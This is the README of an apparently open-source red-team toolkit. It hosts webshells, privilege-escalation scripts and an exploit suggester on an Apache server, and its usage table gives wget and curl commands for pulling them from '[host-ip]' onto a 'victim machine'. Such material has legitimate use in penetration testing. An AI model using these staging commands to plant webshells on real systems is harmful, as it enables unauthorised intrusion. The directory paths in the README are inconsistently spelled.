# redteam-apache-toolkit
An apache2 webserver toolkit to enable tool downloads from attacker to target machine via http

## Installation 

To use, the redteam-apache-tookit needs to be located inside /var/www/html. There are two options to do this.  

1) Navigate inside /var/www/html, then use  
```bash
git clone https://github.com/tcbutler320/redteam-apache-toolkit.git  
```  
2) Clone the repoistory to a location of your choosing, then use 
```bash
cp -r redteam-apache-toolkit /var/www/html
```

## Features   
The toolkit includes many tools that come with the latest Kali Linux Distribution as well as some custom tools from the community. See the credits section for details. 


| Category  | Description | Path  |
|---|---|---|
|  Webshells | A collection of webhells broken down by language   |  /redteam-apache-toolkit/webshells |
| priv-escalation  |  Privelege escalation scripts for windows and unix | /redtean-apache-toolkit/priv-escalation  |
| Exploit Suggester  |  A custom exploit suggester script from the pentestmonkeys |  /redteam-apache2-toolkit/exploit-suggester |

## Usage 

1) Start the apache2 webserver 
```bash
service apache2 start
```  
2) Choose the tool you want to transfer to the victim machine   
2) Choose a method of http transfer 


| Method  | Command   |
|---|---|
| wget  | ```wget http://[host-ip]/redteam-apache2-toolkit/[tool category]/[tool name]```  |
|  curl | ``` curl -o [name the file]  http://[host-ip]/redteam-apache2-toolkit/[tool category]/[tool name] ``` |


## Credits   
Thanks to the following for great open source tools included in this kit.   

1) [Pentestmonkey](http://pentestmonkey.net/)